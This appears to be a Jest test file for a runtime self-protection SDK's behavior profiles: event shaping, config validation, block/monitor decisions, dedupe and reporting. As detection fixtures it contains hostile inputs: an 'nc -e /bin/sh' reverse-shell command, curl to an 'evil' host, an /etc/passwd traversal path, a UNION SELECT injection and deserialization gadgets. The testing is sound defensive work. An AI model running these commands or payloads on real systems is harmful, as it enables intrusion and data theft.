/**
 * Behavior profiles (README "Behavior profiles (`novel_behavior`)"): shapes
 * per category, the signed `behavior` block's validation and limits (keep
 * the last good one), the decision table, dedupe, the observation report's
 * batching, caps and drops, the hooks feeding it, and that nothing throws
 * into the app but the block error.
 */
import fs = require('fs');
import { tmpdir } from 'os';
import { join } from 'path';
import { runWithInputs } from '../context';
import { configureEngine, setEventSink, setMonitorOnly } from '../engine';
import {
  BehaviorReporter,
  behaviorMode,
  buildReport,
  decide,
  finishStartup,
  MAX_PENDING,
  observe,
  observeModule,
  observeWith,
  parseBehavior,
  pendingCount,
  resetBehavior,
  setBehaviorConfig,
  startupFinished,
  takeObservations,
  type Observation,
} from '../behavior';
import {
  commandNames,
  deserShape,
  fileShape,
  hostShape,
  moduleShape,
  normalizeSql,
  outboundShape,
  processShapes,
  segmentTemplate,
  sqlShape,
} from '../behavior-shapes';
import { installFsHooks, uninstallFsHooks } from '../hooks/fs';
import { patchPg, unpatchPg } from '../hooks/db';
import { RaspBlockedError, type AttackType, type RaspMode } from '../types';

type Ev = { name: string; attrs: Record<string, string> };
const events: Ev[] = [];
let clock = 1_800_000_000_000;

function engine(attacks: Partial<Record<AttackType, RaspMode>> = {}) {
  configureEngine({ enabled: true, applicationName: 'orders-api', mode: 'monitor', attacks, env: {} });
  setEventSink({ add: (e) => events.push(e) });
}
const inRequest = <T>(route: string, fn: () => T): T => runWithInputs([], fn, { inRequest: true, route, path: route });

beforeEach(() => {
  events.length = 0;
  clock = 1_800_000_000_000;
  resetBehavior({ now: () => clock });
  engine();
});
afterAll(() => {
  resetBehavior();
  setEventSink(undefined);
  configureEngine({ enabled: false, applicationName: 'default', env: {} });
});

// ---- Shapes --------------------------------------------------------------------

describe('process shapes', () => {
  it('is the basename of the executable, lower case, without .exe', () => {
    expect(processShapes({ argv: ['/usr/bin/git', 'status'] })).toEqual(['git']);
    expect(processShapes({ argv: ['C:\\Tools\\Git.EXE', 'log'] })).toEqual(['git']);
  });
  it('adds the shell and every program of a command line, never arguments', () => {
    expect(processShapes({ command: 'ls -la /tmp | grep x; curl http://evil' }, 'linux')).toEqual(['sh', 'ls', 'grep', 'curl']);
    expect(processShapes({ command: 'FOO=1 git pull && $(wget x)' }, 'linux')).toEqual(['sh', 'git', 'wget']);
    expect(processShapes({ command: 'dir' }, 'win32')).toEqual(['cmd', 'dir']);
  });
  it('reads the script of sh -c', () => {
    expect(processShapes({ argv: ['/bin/bash', '-c', 'id; nc -e /bin/sh 1.2.3.4 9'] })).toEqual(['bash', 'id', 'nc']);
  });
  it('turns a name that is not a plain name into *', () => {
    expect(commandNames('"/tmp/a b/x y" --flag')).toEqual(['*']);
    expect(commandNames("A=1 B='x y' '/usr/bin/env' node")).toEqual(['env']);
  });
});

describe('file shapes', () => {
  it('masks digits, UUIDs, hex and dates and keeps the extension', () => {
    expect(fileShape('/app/uploads/12345.png', true)).toBe('write:/app/uploads/*.png');
    expect(fileShape('/app/uploads/3f2a9c1b4d5e.PNG', true)).toBe('write:/app/uploads/*.png');
    expect(fileShape('/data/users/123e4567-e89b-12d3-a456-426614174000/avatar.jpg', false)).toBe('read:/data/users/*/avatar.jpg');
    expect(fileShape('/var/log/app/2026-11-23/out.log', true)).toBe('write:/var/log/app/*/out.log');
    expect(fileShape('/var/log/app-2026-11-23.log', true)).toBe('write:/var/log/app-*.log');
  });
  it('keeps at most 5 segments: the first 4, **, the last', () => {
    expect(fileShape('/a/b/c/d/e', false)).toBe('read:/a/b/c/d/e');
    expect(fileShape('/a/b/c/d/e/f/g/x.js', false)).toBe('read:/a/b/c/d/**/x.js');
  });
  it('resolves relative paths and .. segments', () => {
    expect(fileShape('/app/public/../../etc/passwd', false)).toBe('read:/etc/passwd');
  });
  it('starts paths under the temp dir with tmp:', () => {
    expect(fileShape(join(tmpdir(), 'upload-998877', 'part.bin'), true)).toBe('write:tmp:/upload-*/part.bin');
    expect(fileShape('/tmp/x.txt', false)).toBe('read:tmp:/x.txt');
  });
  it('masks odd and opaque segments whole', () => {
    expect(segmentTemplate('hello world')).toBe('*');
    expect(segmentTemplate(['sk', 'live', '9f8a7b6c5d4e3f2a1b0c9d8e'].join('_'))).toBe('*');
    expect(segmentTemplate('node_modules')).toBe('node_modules');
  });
  it('is at most 200 characters', () => {
    expect(fileShape(`/${'a'.repeat(60)}/${'b'.repeat(60)}/${'c'.repeat(60)}/${'d'.repeat(60)}/x`, false).length).toBeLessThanOrEqual(200);
  });
});

describe('outbound shapes', () => {
  it('is lower-case host:port with the default port', () => {
    expect(outboundShape('https://API.Stripe.com/v1/charges?x=1')).toBe('api.stripe.com:443');
    expect(outboundShape('http://example.com:8080/')).toBe('example.com:8080');
    expect(outboundShape('http://example.com/')).toBe('example.com:80');
  });
  it('cuts IP literals to /24 and /48', () => {
    expect(outboundShape('http://10.1.2.77:9000/')).toBe('ip:10.1.2.0/24:9000');
    expect(outboundShape('http://[2001:db8:1:2::5]/')).toBe('ip:2001:db8:1::/48:80');
    expect(hostShape('::ffff:192.168.7.9', '443')).toBe('ip:192.168.7.0/24:443');
  });
  it('masks id-like labels (no data in a shape)', () => {
    expect(outboundShape('https://3f2a9c1b4d5e6f70.attacker.example/')).toBe('*.attacker.example:443');
    expect(outboundShape('https://12345.tenant.example.com')).toBe('*.tenant.example.com:443');
  });
  it('is null for something that is not a URL', () => {
    expect(outboundShape('not a url')).toBeNull();
  });
});

describe('sql shapes', () => {
  it('ignores literals, numbers and IN-list lengths', () => {
    const a = sqlShape("SELECT * FROM users WHERE id = 1 AND name = 'bob' AND role IN (1, 2, 3)");
    const b = sqlShape("select *  from users where id = 42 and name = 'alice' and role in (7)");
    const c = sqlShape('SELECT * FROM users WHERE id = $1 AND name = $2 AND role IN ($3, $4)', 'postgres');
    expect(a).toBe(b);
    expect(a).toBe(c);
    expect(a).toMatch(/^select:[0-9a-f]{16}$/);
  });
  it('changes when the structure changes (an injected UNION)', () => {
    expect(sqlShape("SELECT * FROM users WHERE id = '1'")).not.toBe(sqlShape("SELECT * FROM users WHERE id = '1' UNION SELECT password FROM admins"));
  });
  it('collapses multi-row VALUES and drops comments', () => {
    expect(normalizeSql('INSERT INTO t (a, b) VALUES (1, 2), (3, 4) -- note').normalized).toBe('insert into t ( a , b ) values (?)');
    expect(normalizeSql('/* x */ UPDATE t SET a = 1').verb).toBe('update');
  });
});

describe('deser shapes', () => {
  it('is the format, plus the first explicit type', () => {
    expect(deserShape('yaml', 'a: 1')).toBe('yaml');
    expect(deserShape('yaml', 'a: !!str x\nb: !!js/function "function(){}"')).toBe('yaml:js/function');
    expect(deserShape('node_serialize', '{"rce":"_$$ND_FUNC$$_function(){}"}')).toBe('node_serialize:function');
    expect(deserShape('funcster', '{"__js_function":"x"}')).toBe('funcster:function');
    expect(deserShape('Bad Format', 'x')).toBe('*');
  });
});

describe('module shapes', () => {
  it('names built-ins, packages and path templates', () => {
    expect(moduleShape('node:child_process')).toBe('child_process');
    expect(moduleShape('fs/promises')).toBe('fs/promises');
    expect(moduleShape('@aws-sdk/client-s3')).toBe('@aws-sdk/client-s3');
    expect(moduleShape('lodash/fp/map')).toBe('lodash/fp/map');
    expect(moduleShape('./plugins/12345.js')).toBe('./plugins/*.js');
    expect(moduleShape('/srv/app/uploads/3f2a9c1b4d5e.js')).toBe('/srv/app/uploads/*.js');
  });
});

// ---- Config ----------------------------------------------------------------------

const cfg = (over: Record<string, unknown> = {}) => ({ mode: 'monitor', block_categories: [], profile: {}, deny: {}, profile_version: 'p1', ...over });

describe('the behavior block', () => {
  it('absent or null is off', () => {
    expect(parseBehavior(undefined)).toEqual({ ok: true, config: null });
    expect(parseBehavior(null)).toEqual({ ok: true, config: null });
    setBehaviorConfig(undefined);
    expect(behaviorMode()).toBe('off');
  });
  it.each([
    ['not an object', [], 'behavior'],
    ['unknown mode', cfg({ mode: 'enforce' }), 'mode'],
    ['unknown block category', cfg({ block_categories: ['network'] }), 'block_categories'],
    ['block categories not a list', cfg({ block_categories: 'file' }), 'block_categories'],
    ['unknown profile category', cfg({ profile: { '*': { network: ['x'] } } }), 'shapes'],
    ['a shape that is not a string', cfg({ profile: { '*': { file: [1] } } }), 'shapes'],
    ['an empty shape', cfg({ profile: { '*': { file: [''] } } }), 'shapes'],
    ['a shape over 200 characters', cfg({ profile: { '*': { file: ['x'.repeat(201)] } } }), 'shapes'],
    ['a bad deny list', cfg({ deny: { file: 'x' } }), 'deny'],
    ['a profile version over 128', cfg({ profile_version: 'v'.repeat(129) }), 'profile_version'],
  ])('refuses %s', (_name, raw, reason) => {
    expect(parseBehavior(raw)).toEqual({ ok: false, reason });
  });
  it('accepts sql in block_categories and ignores it', () => {
    const r = parseBehavior(cfg({ block_categories: ['sql', 'file'] }));
    expect(r.ok && [...r.config!.blockCategories]).toEqual(['file']);
  });
  it('refuses more than 5000 shapes across profile and deny', () => {
    const many = (n: number, p: string) => Array.from({ length: n }, (_, i) => `${p}${i}`);
    expect(parseBehavior(cfg({ profile: { '*': { process: many(4000, 'a') } }, deny: { process: many(1000, 'b') } })).ok).toBe(true);
    expect(parseBehavior(cfg({ profile: { '*': { process: many(4000, 'a') } }, deny: { process: many(1001, 'b') } }))).toEqual({ ok: false, reason: 'limit' });
  });
  it('keeps the last good block when a new one breaks the contract, and warns once per reason', () => {
    const warnings: string[] = [];
    resetBehavior({ now: () => clock, onWarning: (r) => warnings.push(r) });
    setBehaviorConfig(cfg({ mode: 'learn' }));
    expect(setBehaviorConfig(cfg({ mode: 'bogus' })).ok).toBe(false);
    setBehaviorConfig(cfg({ mode: 'bogus' }));
    expect(behaviorMode()).toBe('learn');
    expect(warnings).toEqual(['mode']);
    // Absent again: off (not "keep").
    setBehaviorConfig(undefined);
    expect(behaviorMode()).toBe('off');
  });
});

// ---- Decisions -------------------------------------------------------------------

describe('decisions', () => {
  const novel = () => events.filter((e) => e.attrs['shield360.rasp.attack'] === 'novel_behavior');

  it('learn reports observations only', () => {
    setBehaviorConfig(cfg({ mode: 'learn', deny: { process: ['nc'] } }));
    inRequest('/orders/:id', () => observe('process', 'nc', 'child_process.spawn'));
    expect(novel()).toHaveLength(0);
    expect(takeObservations().observations).toEqual([{ route: '/orders/:id', category: 'process', shape: 'nc', count: 1, first_seen: new Date(clock).toISOString() }]);
  });

  it('monitor reports a shape in neither profile[route] nor profile["*"], with its attributes', () => {
    setBehaviorConfig(cfg({ profile: { '/orders/:id': { file: ['read:/app/data/*.json'] }, '*': { process: ['git'] } } }));
    inRequest('/orders/:id', () => {
      observe('file', 'read:/app/data/*.json', 'fs.readFile');
      observe('process', 'git', 'child_process.spawn');
      observe('process', 'sh', 'child_process.exec');
    });
    expect(novel()).toHaveLength(1);
    const a = novel()[0].attrs;
    expect(a['shield360.rasp.rule']).toBe('behavior.process');
    expect(a['shield360.rasp.shape']).toBe('sh');
    expect(a['shield360.rasp.route']).toBe('/orders/:id');
    expect(a['shield360.rasp.profile_version']).toBe('p1');
    expect(a['shield360.rasp.decision']).toBe('monitored');
    expect(a['shield360.rasp.sink']).toBe('child_process.exec');
  });

  it('a profile for another route does not count', () => {
    setBehaviorConfig(cfg({ profile: { '/a': { process: ['git'] } } }));
    inRequest('/b', () => observe('process', 'git', 's'));
    expect(novel()).toHaveLength(1);
  });

  it('work outside a request is route "-"', () => {
    setBehaviorConfig(cfg({ profile: { '-': { process: ['git'] } } }));
    observe('process', 'git', 's');
    expect(novel()).toHaveLength(0);
    expect(takeObservations().observations[0].route).toBe('-');
  });

  it('a shape ending in * is a prefix match', () => {
    setBehaviorConfig(cfg({ profile: { '*': { outbound: ['*.amazonaws.com:443'], file: ['read:/app/static/*'] } } }));
    const parsed = parseBehavior(cfg({ profile: { '*': { file: ['read:/app/static/*'] } } }));
    if (!parsed.ok || !parsed.config) throw new Error('parse');
    expect(decide(parsed.config, '/x', 'file', 'read:/app/static/css/a.css')).toBeNull();
    expect(decide(parsed.config, '/x', 'file', 'read:/app/other.css')).toBe('monitor');
    inRequest('/x', () => {
      observe('file', 'read:/app/static/img/*.png', 'fs.readFile');
      observe('file', 'read:/app/private/a.txt', 'fs.readFile');
    });
    expect(novel().map((e) => e.attrs['shield360.rasp.shape'])).toEqual(['read:/app/private/a.txt']);
  });

  it('block blocks novel shapes in block_categories, and monitors the others', () => {
    setBehaviorConfig(cfg({ mode: 'block', block_categories: ['process'] }));
    expect(() => inRequest('/x', () => observe('process', 'nc', 'child_process.spawn'))).toThrow(RaspBlockedError);
    inRequest('/x', () => observe('file', 'write:/etc/cron.d/x', 'fs.writeFile'));
    const decisions = novel().map((e) => [e.attrs['shield360.rasp.rule'], e.attrs['shield360.rasp.decision']]);
    expect(decisions).toEqual([
      ['behavior.process', 'blocked'],
      ['behavior.file', 'monitored'],
    ]);
  });

  it('sql never blocks, even when listed or denied', () => {
    setBehaviorConfig(cfg({ mode: 'block', block_categories: ['sql', 'process'], deny: { sql: ['select:00000000000000aa'] } }));
    expect(() => inRequest('/x', () => observe('sql', 'select:0123456789abcdef', 'db.pg.query'))).not.toThrow();
    expect(() => inRequest('/x', () => observe('sql', 'select:00000000000000aa', 'db.pg.query'))).not.toThrow();
    expect(novel().map((e) => e.attrs['shield360.rasp.decision'])).toEqual(['monitored', 'monitored']);
  });

  it('deny blocks in monitor and block modes, even when the profile lists the shape', () => {
    setBehaviorConfig(cfg({ mode: 'monitor', profile: { '*': { process: ['nc'] } }, deny: { process: ['nc'] } }));
    expect(() => inRequest('/x', () => observe('process', 'nc', 's'))).toThrow(RaspBlockedError);
    // A deny entry ending in * is a prefix; block_categories does not matter for deny.
    setBehaviorConfig(cfg({ mode: 'block', deny: { outbound: ['ip:169.254.*'] } }));
    expect(() => inRequest('/x', () => observe('outbound', 'ip:169.254.169.0/24:80', 'fetch'))).toThrow(RaspBlockedError);
    expect(() => inRequest('/x', () => observe('outbound', 'ip:10.0.0.0/24:80', 'fetch'))).not.toThrow();
  });

  it('a local off for novel_behavior turns it all off; no pinned key caps block at monitor', () => {
    setBehaviorConfig(cfg({ mode: 'block', block_categories: ['process'] }));
    engine({ novel_behavior: 'off' });
    inRequest('/x', () => observe('process', 'nc', 's'));
    expect(novel()).toHaveLength(0);
    expect(pendingCount()).toBe(0);
    expect(behaviorMode()).toBe('off');
    engine();
    setMonitorOnly(true);
    expect(() => inRequest('/x', () => observe('process', 'nc', 's'))).not.toThrow();
    expect(novel()[0].attrs['shield360.rasp.decision']).toBe('monitored');
    setMonitorOnly(false);
  });
});

describe('dedupe', () => {
  it('reports a novel (route, category, shape) at most once per 10 minutes', () => {
    setBehaviorConfig(cfg());
    for (let i = 0; i < 3; i++) inRequest('/x', () => observe('process', 'nc', 's'));
    inRequest('/y', () => observe('process', 'nc', 's'));
    expect(events).toHaveLength(2);
    clock += 10 * 60_000;
    inRequest('/x', () => observe('process', 'nc', 's'));
    expect(events).toHaveLength(3);
    // Observations still count every call.
    const obs = takeObservations().observations;
    expect(obs.find((o) => o.route === '/x')!.count).toBe(4);
  });

  it('still blocks every time, with the first event id', () => {
    setBehaviorConfig(cfg({ mode: 'block', block_categories: ['process'] }));
    const ids: string[] = [];
    for (let i = 0; i < 3; i++) {
      try {
        inRequest('/x', () => observe('process', 'nc', 's'));
      } catch (e) {
        ids.push((e as RaspBlockedError).eventId);
      }
    }
    expect(ids).toHaveLength(3);
    expect(new Set(ids).size).toBe(1);
    expect(events).toHaveLength(1);
    expect(events[0].attrs['shield360.rasp.event_id']).toBe(ids[0]);
  });
});

// ---- Observation report ----------------------------------------------------------

describe('observation report', () => {
  const obs = (i: number, shape = `s${i}`): Observation => ({ route: '/x', category: 'process', shape, count: 1, first_seen: 't' });

  it('aggregates counts per key since the last report', () => {
    setBehaviorConfig(cfg({ mode: 'learn' }));
    for (let i = 0; i < 5; i++) observe('process', 'git', 's');
    observe('process', 'ls', 's');
    const t = takeObservations();
    expect(t.observations.map((o) => [o.shape, o.count])).toEqual([
      ['git', 5],
      ['ls', 1],
    ]);
    expect(takeObservations().observations).toEqual([]);
  });

  it('caps pending keys at 5000 and counts the rest as dropped', () => {
    setBehaviorConfig(cfg({ mode: 'learn' }));
    for (let i = 0; i < MAX_PENDING + 7; i++) observe('process', `p${i}`, 's');
    observe('process', 'p0', 's');
    const t = takeObservations();
    expect(t.observations).toHaveLength(MAX_PENDING);
    expect(t.dropped).toBe(7);
    expect(t.observations[0].count).toBe(2);
  });

  it('sends at most 500 observations and 64 KB, counting drops', () => {
    const r = buildReport({ app: 'a', version: '1.5.0' }, { observations: Array.from({ length: 600 }, (_, i) => obs(i)), dropped: 3 });
    expect(r.observations).toHaveLength(500);
    expect(r.dropped).toBe(103);
    const big = buildReport({ app: 'a', version: '1' }, { observations: Array.from({ length: 450 }, (_, i) => obs(i, `${'x'.repeat(190)}${i}`)), dropped: 0 });
    expect(Buffer.byteLength(JSON.stringify(big))).toBeLessThanOrEqual(64 * 1024);
    expect(big.observations.length + big.dropped).toBe(450);
    expect(big.dropped).toBeGreaterThan(0);
  });

  it('sends the app version as app_version, and leaves it out when unknown', () => {
    const taken = { observations: [obs(1)], dropped: 0 };
    expect(buildReport({ app: 'a', version: '1.5.0', appVersion: 'v2.4.1' }, taken)).toMatchObject({ version: '1.5.0', app_version: 'v2.4.1' });
    expect(buildReport({ app: 'a', version: '1.5.0' }, taken)).not.toHaveProperty('app_version');
    expect(buildReport({ app: 'a', version: '1.5.0', appVersion: '  ' }, taken)).not.toHaveProperty('app_version');
    expect(buildReport({ app: 'a', version: '1.5.0', appVersion: 'x'.repeat(80) }, taken).app_version).toHaveLength(64);
  });

  it('posts the report with the API key, and nothing when behavior is off', async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const fetchImpl = (async (url: string, init: RequestInit) => {
      calls.push({ url, init });
      return new Response('{}');
    }) as unknown as typeof fetch;
    const rep = new BehaviorReporter({ url: 'https://shield.example/', apiKey: 'k', applicationName: 'orders-api', sdkVersion: '1.5.0', appVersion: '2026.11.3', environment: 'production', fetchImpl });
    setBehaviorConfig(cfg({ mode: 'learn' }));
    inRequest('/orders/:id', () => observe('outbound', 'api.stripe.com:443', 'fetch'));
    await rep.flush();
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe('https://shield.example/api/app-security/rasp/behavior');
    expect((calls[0].init.headers as Record<string, string>).Authorization).toBe('Bearer k');
    const body = JSON.parse(String(calls[0].init.body));
    expect(body).toEqual({
      app: 'orders-api',
      version: '1.5.0',
      app_version: '2026.11.3',
      environment: 'production',
      observations: [{ route: '/orders/:id', category: 'outbound', shape: 'api.stripe.com:443', count: 1, first_seen: new Date(clock).toISOString() }],
      dropped: 0,
    });
    // Nothing pending: nothing sent.
    await rep.flush();
    expect(calls).toHaveLength(1);
    // Off: dropped, never sent.
    observe('process', 'git', 's');
    setBehaviorConfig(cfg({ mode: 'off' }));
    await rep.flush();
    expect(calls).toHaveLength(1);
  });

  it('never rejects when the transport fails', async () => {
    setBehaviorConfig(cfg({ mode: 'learn' }));
    const failing = new BehaviorReporter({ url: 'https://s', apiKey: 'k', applicationName: 'a', fetchImpl: (() => Promise.reject(new Error('down'))) as unknown as typeof fetch });
    const throwing = new BehaviorReporter({ url: 'https://s', apiKey: 'k', applicationName: 'a', fetchImpl: (() => { throw new Error('sync'); }) as unknown as typeof fetch });
    observe('process', 'git', 's');
    await expect(failing.flush()).resolves.toBeUndefined();
    observe('process', 'git', 's');
    await expect(throwing.stop()).resolves.toBeUndefined();
  });
});

// ---- Never throws, start-up, hooks -------------------------------------------------

describe('fail open', () => {
  it('a shape computation that throws never reaches the app', () => {
    setBehaviorConfig(cfg({ mode: 'block', block_categories: ['process'] }));
    expect(() => observeWith('process', 's', () => { throw new TypeError('boom'); })).not.toThrow();
  });
  it('does not compute shapes when behavior is off', () => {
    const shapes = jest.fn(() => 'x');
    observeWith('process', 's', shapes);
    expect(shapes).not.toHaveBeenCalled();
  });
  it('a sink that throws while reporting does not break the call', () => {
    setBehaviorConfig(cfg());
    setEventSink({ add: () => { throw new Error('sink'); } });
    expect(() => inRequest('/x', () => observe('process', 'nc', 's'))).not.toThrow();
  });
});

describe('modules', () => {
  it('are observed only after start-up (first request, or the clock)', () => {
    setBehaviorConfig(cfg({ mode: 'learn' }));
    observeModule('lodash');
    expect(pendingCount()).toBe(0);
    inRequest('/x', () => observeModule('child_process'));
    expect(startupFinished()).toBe(true);
    observeModule('node:vm');
    expect(takeObservations().observations.map((o) => [o.route, o.shape])).toEqual([
      ['/x', 'child_process'],
      ['-', 'vm'],
    ]);
  });
});

describe('hooks feed observations', () => {
  afterEach(() => uninstallFsHooks());

  it('fs reads and writes become file shapes; a novel write is blocked before it happens', () => {
    const dir = fs.mkdtempSync(join(tmpdir(), 'behavior-'));
    const file = join(dir, 'report-12345.txt');
    fs.writeFileSync(file, 'x');
    setBehaviorConfig(cfg({ mode: 'block', block_categories: ['file'], profile: { '/r': { file: [fileShape(file, false)] } } }));
    installFsHooks();
    finishStartup();
    inRequest('/r', () => fs.readFileSync(file, 'utf8'));
    expect(() => inRequest('/r', () => fs.writeFileSync(join(dir, 'new.php'), '<?php'))).toThrow(RaspBlockedError);
    uninstallFsHooks();
    expect(fs.existsSync(join(dir, 'new.php'))).toBe(false);
    const shapes = takeObservations().observations.map((o) => o.shape);
    expect(shapes).toContain(fileShape(file, false));
    expect(fileShape(file, false)).toMatch(/^read:tmp:\/.+\/report-\*\.txt$/);
    expect(shapes.some((s) => s.startsWith('write:tmp:/') && s.endsWith('/new.php'))).toBe(true);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('SQL text becomes a sql shape, in a request or not', () => {
    const query = jest.fn();
    class Client {}
    Object.defineProperty(Client.prototype, 'query', { value: query, configurable: true, writable: true });
    const exportsObj = { Client };
    patchPg(exportsObj);
    try {
      setBehaviorConfig(cfg({ mode: 'learn' }));
      const c = new Client() as { query: (q: unknown) => unknown };
      c.query('SELECT 1');
      inRequest('/q', () => c.query({ text: 'SELECT * FROM t WHERE id = $1' }));
      const obs = takeObservations().observations;
      expect(obs.map((o) => [o.route, o.category, o.shape])).toEqual([
        ['-', 'sql', sqlShape('SELECT 1', 'postgres')],
        ['/q', 'sql', sqlShape('SELECT * FROM t WHERE id = $1', 'postgres')],
      ]);
      expect(query).toHaveBeenCalledTimes(2);
    } finally {
      unpatchPg(exportsObj);
    }
  });
});

describe('performance', () => {
  it('keeps the per-call overhead small', () => {
    const behaviorConfigForTest = () => cfg({ mode: 'monitor', profile: { '*': { file: ['read:/app/data/*.json'], sql: [sqlShape('SELECT * FROM t WHERE id = ?')] } } });
    setBehaviorConfig(behaviorConfigForTest());
    const n = 20_000;
    const time = (fn: () => void) => {
      for (let i = 0; i < 1000; i++) fn();
      const t = process.hrtime.bigint();
      for (let i = 0; i < n; i++) fn();
      return Number(process.hrtime.bigint() - t) / n / 1000; // microseconds per call
    };
    const profile = behaviorConfigForTest();
    setBehaviorConfig(undefined);
    const off = time(() => observeWith('file', 'fs.readFile', () => fileShape('/app/data/12.json', false)));
    setBehaviorConfig(profile);
    const file = time(() => inRequest('/x', () => observeWith('file', 'fs.readFile', () => fileShape('/app/data/12.json', false))));
    const sql = time(() => observeWith('sql', 'db.pg.query', () => sqlShape('SELECT * FROM t WHERE id = ?')));
    const uncachedSql = time(() => observeWith('sql', 'db.pg.query', () => sqlShape(`SELECT * FROM t WHERE id = ? -- ${'x'.repeat(5000)}`)));
    // Printed for the PR; the bounds are loose so a slow CI machine still passes.
    console.log(`behavior overhead per call: off ${off.toFixed(3)} µs, file ${file.toFixed(2)} µs, sql (cached) ${sql.toFixed(2)} µs, sql (5 KB, uncached) ${uncachedSql.toFixed(1)} µs`);
    expect(off).toBeLessThan(1);
    expect(file).toBeLessThan(50);
    expect(sql).toBeLessThan(50);
  });
});
